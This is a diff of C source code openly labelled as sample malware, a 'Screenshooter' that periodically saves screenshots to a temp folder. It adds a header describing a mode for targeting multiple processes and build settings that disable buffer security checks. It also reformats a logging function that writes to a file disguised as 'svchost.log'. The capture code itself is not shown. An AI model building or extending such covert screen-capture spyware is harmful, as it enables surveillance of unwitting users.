@@ -1,3 +1,31 @@
+/*-------------------------------------------------------------------------------------------------
+ *
+ *      Sample Malware: Screenshooter
+ *      Function      : Take screenshots periodically and store in %TMP%\shots\
+ *      Note 1        : Some of the GDI APIs should be made from the same process
+ *                      The malware is designed such that in BBS mode,
+ *                      all the GDI dependencies will be met.
+ *                      Thus, BBS mode should be used when targetting multiple processes 
+ * 
+ *-----------------------------------------------------------------------------------------------
+ *
+ *        Best built in Visual Studio 10
+ *          Porject settings (Configuration Properties):
+ * 
+ *              1. C/C++ --> Advanced --> Calling convention
+ *                 Set __stdcall (Gz)
+ * 
+ *              2. C/C++ --> Code Generation --> Buffer Security Check
+ *                 Set NO
+ * 
+ *              3. Linker --> General --> Enable Incremental Linking
+ *                 Set NO
+ * 
+ *              4. Linker --> System --> SubSystem
+ *                 Set CONSOLE
+ *
+ *-----------------------------------------------------------------------------------------------*/
+
 #include<Windows.h>
 #include<direct.h>
 
@@ -15,17 +43,17 @@ void log(const char* msg, DWORD err){
     strcat(file_name, "shots\\svchost.log");
     HANDLE logFile = CreateFileA(
                                 file_name,
-                                FILE_APPEND_DATA,                                             // open for writing
-                                FILE_SHARE_READ | FILE_SHARE_WRITE,         // allow multiple readers
-                                NULL,                                                                     // no security
-                                OPEN_ALWAYS,                                                        // open or create
-                                FILE_ATTRIBUTE_NORMAL,                                    // normal file
+                                FILE_APPEND_DATA,                     // open for writing
+                                FILE_SHARE_READ | FILE_SHARE_WRITE,   // allow multiple readers
+                                NULL,                                 // no security
+                                OPEN_ALWAYS,                          // open or create
+                                FILE_ATTRIBUTE_NORMAL,                // normal file
                                 NULL);     
     SetFilePointer(
-                logFile,                                                                        // file name
-                0,                                                                                    // offset
-                0,                                                                                    // offset
-                FILE_END);                                                                    // offset reference point
+                logFile,                                              // file name
+                0,                                                    // offset
+                0,                                                    // offset
+                FILE_END);                                            // offset reference point
     char error[250];
     DWORD dwBytesWritten;
     wsprintfA(error, msg, err);
